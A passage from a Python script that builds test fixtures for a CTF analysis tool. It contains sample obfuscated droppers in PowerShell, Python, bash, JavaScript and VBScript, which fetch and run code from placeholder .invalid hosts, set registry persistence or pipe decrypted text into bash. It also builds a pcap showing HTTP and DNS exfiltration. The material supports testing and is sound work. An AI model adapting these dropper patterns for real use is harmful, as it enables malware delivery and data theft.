"""Generate the test fixtures in tests/fixtures/ (run: make fixtures).

Every fixture mirrors a real challenge shape, built with known keys and fake flags.
The output is deterministic (fixed seed), so re-running it changes nothing.
Never put real challenge flags here.
"""

from __future__ import annotations

import base64
import binascii
import hashlib
import hmac
import io
import json
import math
import random
import sqlite3
import struct
import zipfile
import zlib
from pathlib import Path

from Crypto.Cipher import AES, PKCS1_OAEP, ChaCha20, PKCS1_v1_5
from Crypto.PublicKey import RSA
from Crypto.Util.number import bytes_to_long, getPrime, inverse, isPrime, long_to_bytes
from Crypto.Util.Padding import pad

FIXTURES = Path(__file__).parent / "fixtures"
RNG = random.Random(1337)  # fixed seed: same bytes every time


def write(name: str, data: bytes | str) -> None:
    path = FIXTURES / name
    path.write_bytes(data.encode("utf-8") if isinstance(data, str) else data)
    print(f"  {name:32} {path.stat().st_size} bytes")


def zipcrypto_encrypt(data: bytes, password: bytes, check_byte: int) -> bytes:
    """Encrypt one entry with the traditional PKWARE ("ZipCrypto") cipher.

    A 96-bit keystream state is seeded from the password, a 12-byte random header
    (whose last byte is a known check value) is prepended, and every byte is XORed
    with one keystream byte while the state is stirred by the *plaintext* byte.
    This is exactly the stream bkcrack attacks given a little known plaintext.
    """
    keys = [0x12345678, 0x23456789, 0x34567890]

    def update(byte: int) -> None:
        keys[0] = zlib.crc32(bytes([byte]), keys[0]) & 0xFFFFFFFF
        keys[1] = (keys[1] + (keys[0] & 0xFF)) & 0xFFFFFFFF
        keys[1] = (keys[1] * 134775813 + 1) & 0xFFFFFFFF
        keys[2] = zlib.crc32(bytes([keys[1] >> 24]), keys[2]) & 0xFFFFFFFF

    def stream_byte() -> int:
        temp = (keys[2] | 2) & 0xFFFF
        return ((temp * (temp ^ 1)) >> 8) & 0xFF

    for byte in password:
        update(byte)
    header = bytearray(RNG.randbytes(11)) + bytes([check_byte])
    out = bytearray()
    for byte in bytes(header) + data:
        out.append(byte ^ stream_byte())
        update(byte)
    return bytes(out)


def zipcrypto_zip(entry_name: str, content: bytes, password: bytes) -> bytes:
    """A single-entry ZIP encrypted with ZipCrypto, deflate-stored (method 8).

    Written by hand because stdlib `zipfile` cannot produce ZipCrypto. The entry is
    one uncompressed deflate block, so the content (a PNG here) is literally present
    five bytes into the stream - the known-plaintext offset bkcrack needs.
    """
    raw = zlib.compressobj(0, zlib.DEFLATED, -zlib.MAX_WBITS)
    deflated = raw.compress(content) + raw.flush()
    crc = zlib.crc32(content) & 0xFFFFFFFF
    encrypted = zipcrypto_encrypt(deflated, password, check_byte=crc >> 24)
    name = entry_name.encode()
    flag = 0x0001  # bit 0: the entry is encrypted
    method = 8  # deflate
    comp_size = len(encrypted)
    local = struct.pack(
        "<IHHHHHIIIHH",
        0x04034B50,
        20,
        flag,
        method,
        0,
        0,
        crc,
        comp_size,
        len(content),
        len(name),
        0,
    )
    local += name + encrypted
    central = struct.pack(
        "<IHHHHHHIIIHHHHHII",
        0x02014B50,
        20,
        20,
        flag,
        method,
        0,
        0,
        crc,
        comp_size,
        len(content),
        len(name),
        0,
        0,
        0,
        0,
        0,
        0,
    )
    central += name
    end = struct.pack("<IHHHHIIH", 0x06054B50, 0, 0, 1, 1, len(central), len(local), 0)
    return local + central + end


def ovba_compress(data: bytes) -> bytes:
    """Compress like MS-OVBA 2.4.1, written here to test ctfc's decompressor.

    Greedy LZ77 in 4096-byte chunks. The offset/length split of a copy token
    depends on how much has been produced in the current chunk, which is the part
    worth testing, so this mirrors the spec's rule independently of ctfc.
    """
    out = bytearray(b"\x01")
    for begin in range(0, len(data) or 1, 4096):
        chunk = data[begin : begin + 4096]
        body = bytearray()
        position = 0
        while position < len(chunk):
            flags_at = len(body)
            body.append(0)  # placeholder for the flag byte
            flags = 0
            for bit in range(8):
                if position >= len(chunk):
                    break
                bit_count = max(4, (position - 1).bit_length() if position else 0)
                length_mask = 0xFFFF >> bit_count
                max_length = length_mask + 3
                window = max(0, position - (1 << bit_count))
                best_length, best_offset = 0, 0
                for candidate in range(window, position):
                    length = 0
                    while (
                        length < max_length
                        and position + length < len(chunk)
                        and chunk[candidate + length] == chunk[position + length]
                    ):
                        length += 1
                    if length > best_length:
                        best_length, best_offset = length, position - candidate
                if best_length >= 3:
                    token = ((best_offset - 1) << (16 - bit_count)) | (best_length - 3)
                    body += token.to_bytes(2, "little")
                    flags |= 1 << bit
                    position += best_length
                else:
                    body.append(chunk[position])
                    position += 1
            body[flags_at] = flags
        size = len(body) + 2
        if size - 3 > 0x0FFF:
            raise ValueError("compressed chunk too large for this helper; use smaller input")
        header = 0x8000 | (CHUNK_SIG << 12) | (size - 3)
        out += header.to_bytes(2, "little") + body
    return bytes(out)


CHUNK_SIG = 0b011
ENDOFCHAIN = 0xFFFFFFFE
FREESECT = 0xFFFFFFFF
NOSTREAM = 0xFFFFFFFF


def cfb_write(streams: list[tuple[str, bytes]]) -> bytes:
    """Build a minimal OLE2 compound file holding `streams` under a VBA storage.

    512-byte sectors, one FAT sector, one directory sector. Every stream is made
    at least 4096 bytes by its caller so it uses a normal sector chain and this
    helper does not need to implement the mini stream too.
    """
    sector_size = 512
    # Sector 0 = FAT, sector 1 = directory, stream data from sector 2 on.
    data_sectors: list[bytes] = []
    entries: list[bytes] = []

    def entry(name: str, kind: int, start: int, size: int, left: int, right: int, child: int):
        raw = bytearray(128)
        encoded = name.encode("utf-16-le")
        raw[: len(encoded)] = encoded
        raw[64:66] = (len(encoded) + 2).to_bytes(2, "little")
        raw[66] = kind
        raw[67] = 1  # black
        raw[68:72] = left.to_bytes(4, "little")
        raw[72:76] = right.to_bytes(4, "little")
        raw[76:80] = child.to_bytes(4, "little")
        raw[116:120] = start.to_bytes(4, "little")
        raw[120:128] = size.to_bytes(8, "little")
        return bytes(raw)

    # Lay the stream data out first so we know each one's starting sector.
    starts = []
    next_sector = 2
    for _, payload in streams:
        starts.append(next_sector)
        padded = payload + b"\x00" * (-len(payload) % sector_size)
        for offset in range(0, len(padded), sector_size):
            data_sectors.append(padded[offset : offset + sector_size])
        next_sector += len(padded) // sector_size

    # Directory: root -> "VBA" storage -> the streams as its children.
    # Entry 0 root, entry 1 the VBA storage, entries 2.. the streams.
    entries.append(entry("Root Entry", 5, ENDOFCHAIN, 0, NOSTREAM, NOSTREAM, 1))
    entries.append(entry("VBA", 1, 0, 0, NOSTREAM, NOSTREAM, 2))
    for index, ((name, payload), start) in enumerate(zip(streams, starts, strict=True)):
        # A flat right-leaning chain is a valid (if unbalanced) red-black tree.
        right = 3 + index if index + 1 < len(streams) else NOSTREAM
        entries.append(entry(name, 2, start, len(payload), NOSTREAM, right, NOSTREAM))
    directory = b"".join(entries)
    directory += b"\x00" * (-len(directory) % sector_size)
    directory_sectors = [
        directory[offset : offset + sector_size] for offset in range(0, len(directory), sector_size)
    ]

    # The FAT: sector 0 is the FAT itself, then the directory chain, then the data.
    total = 2 + len(data_sectors) + (len(directory_sectors) - 1)
    fat = [FREESECT] * (sector_size // 4)
    fat[0] = 0xFFFFFFFD  # FATSECT
    # The directory occupies sector 1 and, if longer, sectors after the data.
    fat[1] = ENDOFCHAIN if len(directory_sectors) == 1 else total
    for position, start in enumerate(starts):
        count = len(streams[position][1])
        count = (count + sector_size - 1) // sector_size
        for step in range(count):
            fat[start + step] = ENDOFCHAIN if step == count - 1 else start + step + 1
    fat_sector = b"".join(value.to_bytes(4, "little") for value in fat)

    header = bytearray(512)
    header[0:8] = bytes.fromhex("d0cf11e0a1b11ae1")
    header[24:26] = (0x3E).to_bytes(2, "little")  # minor version
    header[26:28] = (3).to_bytes(2, "little")  # major version 3 = 512-byte sectors
    header[28:30] = (0xFFFE).to_bytes(2, "little")  # little-endian marker
    header[30:32] = (9).to_bytes(2, "little")  # sector shift: 2^9 = 512
    header[32:34] = (6).to_bytes(2, "little")  # mini sector shift: 2^6 = 64
    header[44:48] = (1).to_bytes(4, "little")  # one FAT sector
    header[48:52] = (1).to_bytes(4, "little")  # directory starts at sector 1
    header[56:60] = (4096).to_bytes(4, "little")  # mini stream cutoff
    header[60:64] = ENDOFCHAIN.to_bytes(4, "little")  # no mini FAT
    header[64:68] = (0).to_bytes(4, "little")
    header[68:72] = ENDOFCHAIN.to_bytes(4, "little")  # no DIFAT sectors
    header[72:76] = (0).to_bytes(4, "little")
    difat = [FREESECT] * 109
    difat[0] = 0  # the FAT lives in sector 0
    header[76:512] = b"".join(value.to_bytes(4, "little") for value in difat)

    body = [fat_sector, directory_sectors[0], *data_sectors, *directory_sectors[1:]]
    return bytes(header) + b"".join(body)


def radius_hide_password(password: bytes, authenticator: bytes, secret: bytes) -> bytes:
    """Hide a PAP password the RADIUS way (RFC 2865 section 5.2), independently of ctfc.

    Pad with NULs to a multiple of 16, then XOR each block with MD5(secret + the
    previous ciphertext block), the first block using the authenticator.
    """
    padded = password + b"\x00" * (-len(password) % 16)
    out = bytearray()
    previous = authenticator
    for start in range(0, len(padded), 16):
        block = padded[start : start + 16]
        stream = hashlib.md5(secret + previous).digest()
        cipher = bytes(p ^ s for p, s in zip(block, stream, strict=True))
        out += cipher
        previous = cipher
    return bytes(out)


def evp_bytes_to_key(
    password: bytes, salt: bytes, key_len: int, iv_len: int
) -> tuple[bytes, bytes]:
    """openssl's legacy KDF (MD5, 1 iteration): D_i = MD5(D_{i-1} || password || salt)."""
    derived = b""
    block = b""
    while len(derived) < key_len + iv_len:
        block = hashlib.md5(block + password + salt).digest()
        derived += block
    return derived[:key_len], derived[key_len : key_len + iv_len]


def tiny_png() -> bytes:
    """A valid 1x1 black PNG, built by hand (signature + IHDR + IDAT + IEND)."""

    def chunk(kind: bytes, body: bytes) -> bytes:
        crc = zlib.crc32(kind + body)
        return struct.pack(">I", len(body)) + kind + body + struct.pack(">I", crc)

    ihdr = struct.pack(">IIBBBBB", 1, 1, 8, 0, 0, 0, 0)
    idat = zlib.compress(b"\x00\x00")
    return b"\x89PNG\r\n\x1a\n" + chunk(b"IHDR", ihdr) + chunk(b"IDAT", idat) + chunk(b"IEND", b"")


def small_zip(name: str, content: bytes) -> bytes:
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w", compression=zipfile.ZIP_DEFLATED) as archive:
        info = zipfile.ZipInfo(name, date_time=(2024, 1, 1, 0, 0, 0))
        info.compress_type = zipfile.ZIP_DEFLATED  # ZipInfo defaults to "stored"
        archive.writestr(info, content)
    return buffer.getvalue()


def hide_zero_width(cover: str, secret: bytes) -> str:
    """Hide `secret` as bits: U+200B = 0, U+200C = 1, inserted after the first word."""
    bits = "".join(f"{byte:08b}" for byte in secret)
    hidden = "".join("​" if bit == "0" else "‌" for bit in bits)
    first, rest = cover.split(" ", 1)
    return first + hidden + " " + rest


ENGLISH = (
    "This is a secret message for the team. The meeting is moved to Friday night, "
    "bring the usual equipment and do not talk about it on the phone. "
    "Remember that the password for the server is written on the back of the old "
    "notebook. When you read this, the flag is CYBN{fixture_xor_repeating}. "
)


def xor(data: bytes, key: bytes) -> bytes:
    """Repeating-key XOR (written here independently of ctfc, to test it)."""
    return bytes(byte ^ key[i % len(key)] for i, byte in enumerate(data))


def cbc_cts_encrypt(plain: bytes, key: bytes, iv: bytes) -> bytes:
    """AES-CBC with ciphertext stealing, CS1 layout (what `openssl -cts` produces).

    Written independently of ctfc on purpose: the test must not check the code
    against itself. Verified against `openssl enc -aes-128-cbc-cts`.
    """
    tail = len(plain) % 16
    if tail == 0:
        return AES.new(key, AES.MODE_CBC, iv).encrypt(plain)
    full = AES.new(key, AES.MODE_CBC, iv).encrypt(plain[: len(plain) - tail])
    last_full = full[-16:]
    stolen = plain[len(plain) - tail :] + bytes(16 - tail)
    stolen_xor = bytes(a ^ b for a, b in zip(last_full, stolen, strict=True))
    final = AES.new(key, AES.MODE_ECB).encrypt(stolen_xor)
    # CS1: the truncated block comes first, the full one last.
    return full[:-16] + last_full[:tail] + final


def fernet_token(key: bytes, message: bytes, timestamp: int) -> bytes:
    """Build a Fernet token by hand: version | timestamp | iv | AES-128-CBC | HMAC."""
    iv = hashlib.sha256(message).digest()[:16]  # deterministic, any IV works
    body = AES.new(key[16:], AES.MODE_CBC, iv).encrypt(pad(message, 16))
    parts = b"\x80" + timestamp.to_bytes(8, "big") + iv + body
    return base64.urlsafe_b64encode(parts + hmac.new(key[:16], parts, hashlib.sha256).digest())


def xtea_encrypt_block(block: bytes, key: bytes, endian: str = "big") -> bytes:
    """One XTEA block, written here from the published algorithm (32 rounds)."""
    fmt = ">" if endian == "big" else "<"
    mask, delta = 0xFFFFFFFF, 0x9E3779B9
    v0, v1 = struct.unpack(fmt + "II", block)
    words = struct.unpack(fmt + "4I", key)
    total = 0
    for _ in range(32):
        v0 = (v0 + (((((v1 << 4) ^ (v1 >> 5)) & mask) + v1) ^ (total + words[total & 3]))) & mask
        total = (total + delta) & mask
        v1 = (
            v1 + (((((v0 << 4) ^ (v0 >> 5)) & mask) + v0) ^ (total + words[(total >> 11) & 3]))
        ) & mask
    return struct.pack(fmt + "II", v0, v1)


def powershell_dropper() -> str:
    """A fake PowerShell dropper whose strings are hidden with a single-byte XOR (0x5A)."""

    def hidden(text: str) -> str:
        return ",".join(f"0x{ord(char) ^ 0x5A:02x}" for char in text)

    url = "http://update.example.invalid/payload.exe"
    flag = "CYBN{fixture_powershell_layers}"
    return (
        "# Windows update helper - do not remove\n"
        "$k = 0x5A\n"
        "function Decode-String($bytes) {\n"
        "    return -join ($bytes | ForEach-Object { [char]($_ -bxor $k) })\n"
        "}\n"
        f"$url = Decode-String @({hidden(url)})\n"
        f"$tag = Decode-String @({hidden(flag)})\n"
        "$client = New-Object System.Net.WebClient\n"
        '$path = Join-Path $env:TEMP "update.exe"\n'
        "$client.DownloadFile($url, $path)\n"
        "Start-Process -FilePath $path -WindowStyle Hidden\n"
        'Write-Output "Update finished, please restart the computer when you can."\n'
    )


def lens_python_dropper() -> str:
    """A Python dropper: base64 -> AES-256-CBC -> exec. Never executed by the tests."""
    key = hashlib.sha256(b"correct horse battery staple").digest()
    iv = bytes.fromhex("0f1e2d3c4b5a69788796a5b4c3d2e1f0")
    payload = b'print("CYBN{fixture_lens_python_aes}")\n'
    blob = base64.b64encode(AES.new(key, AES.MODE_CBC, iv).encrypt(pad(payload, 16))).decode()
    return (
        "#!/usr/bin/env python3\n"
        '"""Invoice helper - do not edit."""\n'
        "import base64\n"
        "from Crypto.Cipher import AES\n"
        "from Crypto.Util.Padding import unpad\n"
        "\n"
        f'KEY = bytes.fromhex("{key.hex()}")\n'
        f'IV = bytes.fromhex("{iv.hex()}")\n'
        f'BLOB = "{blob}"\n'
        'CALLBACK = "http://invoice.example.invalid/report.php"\n'
        "\n"
        "def main():\n"
        "    stage = unpad(AES.new(KEY, AES.MODE_CBC, IV).decrypt(base64.b64decode(BLOB)), 16)\n"
        "    exec(stage)\n"
        "\n"
        'if __name__ == "__main__":\n'
        "    main()\n"
    )


def lens_python_layers() -> str:
    """Python, three layers: base64 -> zlib -> repeating-key XOR -> exec."""
    payload = b'print("CYBN{fixture_lens_python_layers}")\n'
    key = b"L4y3rs!"
    blob = base64.b64encode(zlib.compress(xor(payload, key))).decode()
    return (
        "import base64, zlib\n"
        "\n"
        f"K = {key!r}\n"
        f'D = "{blob}"\n'
        "\n"
        "raw = zlib.decompress(base64.b64decode(D))\n"
        "out = bytes(b ^ K[i % len(K)] for i, b in enumerate(raw))\n"
        "exec(out)\n"
    )


def lens_python_fernet() -> str:
    """Python using Fernet with a hardcoded key."""
    key = base64.urlsafe_b64encode(hashlib.sha256(b"fernet-fixture").digest()).decode()
    return (
        "from cryptography.fernet import Fernet\n"
        "\n"
        f'FERNET_KEY = "{key}"\n'
        'TOKEN = "gAAAAABlTmFrZXRoaXNpc25vdGFyZWFsdG9rZW5idXRpdGxvb2tzbGlrZW9uZQ=="\n'
        "\n"
        "print(Fernet(FERNET_KEY).decrypt(TOKEN))\n"
    )


def lens_powershell_dropper() -> str:
    """PowerShell: base64 + single-byte XOR + AES through .NET + a download."""
    payload = 'Write-Host "CYBN{fixture_lens_powershell}"'
    blob = base64.b64encode(xor(payload.encode(), b"\x3b")).decode()
    key_bytes = ", ".join(f"0x{byte:02x}" for byte in hashlib.md5(b"ps-key").digest())
    iv_bytes = ", ".join(f"0x{byte:02x}" for byte in bytes(range(16)))
    return (
        "# Windows maintenance task\n"
        "$k = 0x3b\n"
        f'$enc = "{blob}"\n'
        "$bytes = [System.Convert]::FromBase64String($enc)\n"
        "$clear = -join ($bytes | ForEach-Object { [char]($_ -bxor $k) })\n"
        "Invoke-Expression $clear\n"
        "\n"
        "$aes = New-Object System.Security.Cryptography.AesManaged\n"
        f"$aes.Key = [byte[]] @({key_bytes})\n"
        f"$aes.IV = [byte[]] @({iv_bytes})\n"
        "$client = New-Object System.Net.WebClient\n"
        '$client.DownloadFile("http://update.example.invalid/stage2.bin",'
        ' "C:\\Windows\\Temp\\s2.bin")\n'
        'Set-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"'
        " -Name Updater -Value $PSCommandPath\n"
    )


def lens_javascript_cryptojs() -> str:
    """JavaScript: atob + charCodeAt XOR + CryptoJS.AES with a passphrase."""
    payload = 'console.log("CYBN{fixture_lens_javascript}")'
    blob = base64.b64encode(xor(payload.encode(), b"\x17")).decode()
    return (
        "// analytics helper\n"
        f'var enc = "{blob}";\n'
        "var raw = atob(enc);\n"
        'var out = "";\n'
        "for (var i = 0; i < raw.length; i++) {\n"
        "  out += String.fromCharCode(raw.charCodeAt(i) ^ 0x17);\n"
        "}\n"
        "eval(out);\n"
        "\n"
        'var secret = CryptoJS.AES.decrypt("U2FsdGVkX1+abcdefghijklmnopqrstuvwx==",'
        ' "s3cr3tpassphrase");\n'
        'fetch("http://analytics.example.invalid/beacon");\n'
    )


def lens_bash_openssl() -> str:
    """bash: base64 -d piped into openssl enc -d, with the password on the line."""
    payload = b'echo "CYBN{fixture_lens_bash}"\n'
    salt = bytes.fromhex("a1b2c3d4e5f60718")
    key, iv = evp_bytes_to_key(b"bashpass", salt, 32, 16)
    body = b"Salted__" + salt + AES.new(key, AES.MODE_CBC, iv).encrypt(pad(payload, 16))
    blob = base64.b64encode(body).decode()
    return (
        "#!/bin/bash\n"
        "# system health check\n"
        f'BLOB="{blob}"\n'
        'echo "$BLOB" | base64 -d'
        " | openssl enc -d -aes-256-cbc -md md5 -pass pass:bashpass | bash\n"
        "curl -s http://health.example.invalid/ping > /dev/null\n"
    )


def lens_vbs_dropper() -> str:
    """VBScript: Chr(Asc(c) Xor n) loop, a download and a Run."""
    payload = 'WScript.Echo "CYBN{fixture_lens_vbs}"'
    blob = "".join(f"{byte ^ 0x2A:02x}" for byte in payload.encode())
    return (
        "' Office update helper\n"
        f'Dim data : data = "{blob}"\n'
        "Dim out, i\n"
        "For i = 1 To Len(data) Step 2\n"
        '    out = out & Chr(Asc(Chr(CLng("&H" & Mid(data, i, 2)))) Xor 42)\n'
        "Next\n"
        "ExecuteGlobal out\n"
        "\n"
        'Set http = CreateObject("MSXML2.XMLHTTP")\n'
        'http.Open "GET", "http://office.example.invalid/update.dat", False\n'
        'Set shell = CreateObject("WScript.Shell")\n'
        'shell.Run "cmd /c echo done"\n'
    )


def next_prime(start: int) -> int:
    """The first prime >= start (used to build two primes that are too close)."""
    candidate = start | 1
    while not isPrime(candidate):
        candidate += 2
    return candidate


def oaep(key):
    """PKCS1_OAEP with our seeded RNG: the padding is random, the fixture must not be."""
    return PKCS1_OAEP.new(key, randfunc=RNG.randbytes)


def pkcs1v15(key):
    """Same for PKCS#1 v1.5, whose padding is random non-zero bytes."""
    return PKCS1_v1_5.new(key, randfunc=RNG.randbytes)


def write_rsa_fixtures() -> None:
    """One RSA fixture per classic mistake, plus a correct keypair.

    `getPrime(..., randfunc=RNG.randbytes)` and the two wrappers above keep every
    byte deterministic: running `make fixtures` twice must produce no diff.
    """
    # 1. A correct 1024-bit keypair, with the flag under OAEP and under PKCS#1 v1.5.
    p = getPrime(512, randfunc=RNG.randbytes)
    q = getPrime(512, randfunc=RNG.randbytes)
    key = RSA.construct((p * q, 65537, inverse(65537, (p - 1) * (q - 1)), p, q))
    write("rsa_private.pem", key.export_key())
    write("rsa_public.pem", key.publickey().export_key())
    secret = b"CYBN{fixture_rsa_oaep}"
    write("rsa_oaep.bin", oaep(key.publickey()).encrypt(secret))
    write(
        "rsa_pkcs1v15.bin",
        pkcs1v15(key.publickey()).encrypt(b"CYBN{fixture_rsa_pkcs1v15}"),
    )
    # The textbook case: no padding at all, which plenty of challenges use.
    textbook = bytes_to_long(b"CYBN{fixture_rsa_textbook}")
    write("rsa_textbook.bin", long_to_bytes(pow(textbook, 65537, p * q)))

    # 2. e = 3 on a short message: no key needed, the cube root is the message.
    p3 = getPrime(512, randfunc=RNG.randbytes)
    q3 = getPrime(512, randfunc=RNG.randbytes)
    while (p3 - 1) % 3 == 0:
        p3 = getPrime(512, randfunc=RNG.randbytes)
    while (q3 - 1) % 3 == 0:
        q3 = getPrime(512, randfunc=RNG.randbytes)
    n3 = p3 * q3
    message = bytes_to_long(b"CYBN{fixture_rsa_small_e}")
    assert message**3 < n3, "the message must be short enough not to wrap"
    write("rsa_small_e.pub.pem", RSA.construct((n3, 3)).export_key())
    write("rsa_small_e.bin", long_to_bytes(pow(message, 3, n3)))

    # 3. Two keys sharing a prime: gcd of the moduli breaks both.
    shared = getPrime(512, randfunc=RNG.randbytes)
    other_a = getPrime(512, randfunc=RNG.randbytes)
    other_b = getPrime(512, randfunc=RNG.randbytes)
    n_a, n_b = shared * other_a, shared * other_b
    write("rsa_shared_a.pub.pem", RSA.construct((n_a, 65537)).export_key())
    write("rsa_shared_b.pub.pem", RSA.construct((n_b, 65537)).export_key())
    key_a = RSA.construct((n_a, 65537, inverse(65537, (shared - 1) * (other_a - 1))))
    write("rsa_shared_a.bin", oaep(key_a.publickey()).encrypt(b"CYBN{fixture_rsa_shared}"))

    # 4. p and q next to each other: Fermat finds them in a few steps.
    base = getPrime(512, randfunc=RNG.randbytes)
    p_close = next_prime(base)
    q_close = next_prime(p_close + 2)
    n_close = p_close * q_close
    key_close = RSA.construct((n_close, 65537, inverse(65537, (p_close - 1) * (q_close - 1))))
    write("rsa_fermat.pub.pem", RSA.construct((n_close, 65537)).export_key())
    write("rsa_fermat.bin", oaep(key_close.publickey()).encrypt(b"CYBN{fixture_rsa_fermat}"))

    # 5. A private exponent far too small: Wiener's attack.
    while True:
        pw = getPrime(512, randfunc=RNG.randbytes)
        qw = getPrime(512, randfunc=RNG.randbytes)
        phi = (pw - 1) * (qw - 1)
        d_small = getPrime(120, randfunc=RNG.randbytes)
        if math.gcd(d_small, phi) != 1:
            continue
        e_big = inverse(d_small, phi)
        if e_big.bit_length() > 1000:  # e must really be the big one
            break
    n_w = pw * qw
    write("rsa_wiener.pub.pem", RSA.construct((n_w, e_big)).export_key())
    key_w = RSA.construct((n_w, e_big, d_small, pw, qw))
    write("rsa_wiener.bin", oaep(key_w.publickey()).encrypt(b"CYBN{fixture_rsa_wiener}"))

    # 6. The layered case CLAUDE.md asks for: an AES key||iv blob wrapped with
    #    RSA-OAEP, and the payload encrypted with that AES key.
    blob = RNG.randbytes(48)
    write("rsa_wrapped_key.bin", oaep(key.publickey()).encrypt(blob))
    payload = b"CYBN{fixture_rsa_wrapped_aes} the key travelled inside the RSA blob."
    write(
        "rsa_wrapped_payload.bin",
        AES.new(blob[:32], AES.MODE_CBC, blob[32:]).encrypt(pad(payload, 16)),
    )


def pcap_packet(payload: bytes, timestamp: int) -> bytes:
    """One classic-pcap record: 16-byte header, then the frame."""
    return struct.pack("<IIII", timestamp, 0, len(payload), len(payload)) + payload


# HID usage codes for the characters the USB fixture types (page 0x07).
USB_KEYCODES = {
    **{chr(ord("a") + i): (0x04 + i, False) for i in range(26)},
    **{chr(ord("A") + i): (0x04 + i, True) for i in range(26)},
    **{"1": (0x1E, False), "2": (0x1F, False), "3": (0x20, False), "4": (0x21, False)},
    **{"5": (0x22, False), "6": (0x23, False), "7": (0x24, False), "8": (0x25, False)},
    **{"9": (0x26, False), "0": (0x27, False)},
    "_": (0x2D, True),
    "-": (0x2D, False),
    "{": (0x2F, True),
    "}": (0x30, True),
    "!": (0x1E, True),
    " ": (0x2C, False),
    "\n": (0x28, False),
    "\b": (0x2A, False),  # Backspace: the decoder must really delete
}


def usbmon_frame(report: bytes, device: int = 3, bus: int = 1) -> bytes:
    """One usbmon (mmapped, link type 220) frame carrying an 8-byte HID report.

    The 64-byte pseudo-header is written field by field; only devnum, busnum and
    the lengths matter to a reader, the timestamps are left at zero.
    """
    header = (
        (0).to_bytes(8, "little")  # urb id
        + bytes([ord("C"), 1, 0x81, device])  # type 'C'allback, interrupt, endpoint 1 IN
        + bus.to_bytes(2, "little")
        + bytes([0, 0])  # flag_setup, flag_data
        + (0).to_bytes(8, "little")  # ts_sec
        + (0).to_bytes(4, "little")  # ts_usec
        + (0).to_bytes(4, "little")  # status
        + len(report).to_bytes(4, "little")  # urb length
        + len(report).to_bytes(4, "little")  # captured length
        + bytes(8)  # setup / iso union
        + bytes(16)  # interval, start_frame, xfer_flags, ndesc
    )
    assert len(header) == 64, len(header)
    return header + report


def usb_keystroke_frames(text: str) -> list[bytes]:
    """Type `text` on a keyboard: one report per key, each followed by a release."""
    frames = []
    for char in text:
        code, shift = USB_KEYCODES[char]
        frames.append(usbmon_frame(bytes([0x02 if shift else 0, 0, code, 0, 0, 0, 0, 0])))
        frames.append(usbmon_frame(bytes(8)))  # every key released
    return frames


def ethernet_ipv4(source: str, destination: str, protocol: int, body: bytes) -> bytes:
    """An Ethernet frame carrying an IPv4 packet (no checksums: nothing verifies them)."""

    def address(text: str) -> bytes:
        return bytes(int(part) for part in text.split("."))

    header = (
        struct.pack(">BBHHHBBH", 0x45, 0, 20 + len(body), 0, 0, 64, protocol, 0)
        + address(source)
        + address(destination)
    )
    ether = b"\xaa\xbb\xcc\xdd\xee\x01" + b"\xaa\xbb\xcc\xdd\xee\x02" + b"\x08\x00"
    return ether + header + body


def tcp_segment(source_port: int, destination_port: int, sequence: int, payload: bytes) -> bytes:
    header = struct.pack(
        ">HHIIBBHHH", source_port, destination_port, sequence, 0, 0x50, 0x18, 8192, 0, 0
    )
    return header + payload


def udp_datagram(source_port: int, destination_port: int, payload: bytes) -> bytes:
    return struct.pack(">HHHH", source_port, destination_port, 8 + len(payload), 0) + payload


def dns_query(name: str) -> bytes:
    """A minimal DNS query message for `name`."""
    labels = b"".join(bytes([len(part)]) + part.encode() for part in name.split("."))
    return (
        struct.pack(">HHHHHH", 0x1234, 0x0100, 1, 0, 0, 0) + labels + b"\x00" + b"\x00\x01\x00\x01"
    )


def write_pcap_fixture() -> None:
    """A capture shaped like a real forensics challenge.

    Three things to find: an HTTP response body with the flag, a POST that
    uploads a base64 blob, and a DNS exfiltration in base32 subdomains. The TCP
    payloads are deliberately split across packets so the reassembly is exercised.
    """
    client, server = "10.0.0.5", "93.184.216.34"
    records = []
    time = 1700000000

    # 1. An HTTP response whose body carries the flag, split over two packets.
    body = (
        b"<html><body><h1>Internal report</h1>\n"
        b"<p>The archive password is CYBN{fixture_pcap_http}</p>\n"
        b"</body></html>\n"
    )
    response = (
        b"HTTP/1.1 200 OK\r\n"
        b"Server: nginx/1.18.0\r\n"
        b"Content-Type: text/html\r\n"
        b"Content-Length: " + str(len(body)).encode() + b"\r\n\r\n" + body
    )
    request = (
        b"GET /report.html HTTP/1.1\r\nHost: intranet.example.invalid\r\n"
        b"User-Agent: curl/8.0\r\n\r\n"
    )
    records.append(
        pcap_packet(ethernet_ipv4(client, server, 6, tcp_segment(49152, 80, 1000, request)), time)
    )
    cut = 60
    records.append(
        pcap_packet(
            ethernet_ipv4(server, client, 6, tcp_segment(80, 49152, 5000, response[:cut])), time
        )
    )
    records.append(
        pcap_packet(
            ethernet_ipv4(server, client, 6, tcp_segment(80, 49152, 5000 + cut, response[cut:])),
            time + 1,
        )
    )

    # 2. A POST that uploads a base64 blob (the classic exfiltration over HTTP).
    secret = base64.b64encode(b"CYBN{fixture_pcap_upload} stolen from the workstation")
    post_body = b"data=" + secret
    post = (
        b"POST /upload.php HTTP/1.1\r\nHost: drop.example.invalid\r\n"
        b"Content-Type: application/x-www-form-urlencoded\r\n"
        b"Content-Length: " + str(len(post_body)).encode() + b"\r\n\r\n" + post_body
    )
    records.append(
        pcap_packet(ethernet_ipv4(client, server, 6, tcp_segment(49153, 80, 2000, post)), time + 2)
    )

    # 3. DNS exfiltration: base32 of the flag, 8 characters per query.
    payload = base64.b32encode(b"CYBN{fixture_pcap_dns}").decode().rstrip("=")
    chunks = [payload[index : index + 8] for index in range(0, len(payload), 8)]
    for number, chunk in enumerate(chunks):
        query = dns_query(f"{chunk}.exfil.example.invalid")
        records.append(
            pcap_packet(
                ethernet_ipv4(client, "8.8.8.8", 17, udp_datagram(40000 + number, 53, query)),
                time + 3 + number,
            )
        )

    # 4. Noise: an unrelated DNS lookup and a short TCP segment.
    records.append(
        pcap_packet(
            ethernet_ipv4(client, "8.8.8.8", 17, udp_datagram(40100, 53, dns_query("example.com"))),
            time + 20,
        )
    )
    header = struct.pack("<IHHiIII", 0xA1B2C3D4, 2, 4, 0, 0, 65535, 1)
    write("capture.pcap", header + b"".join(records))


# ---------------------------------------------------------------------------
# M7: classical ciphers and key hunting (all written here, independently of ctfc)
# ---------------------------------------------------------------------------

FRENCH = (
    "Rendez-vous ce soir au vieux port, derriere l'entrepot numero sept. Apportez les "
    "documents et ne parlez de cette affaire a personne, pas meme au telephone. Le "
    "mot de passe du serveur est note au dos du carnet rouge. Quand vous lirez ceci, "
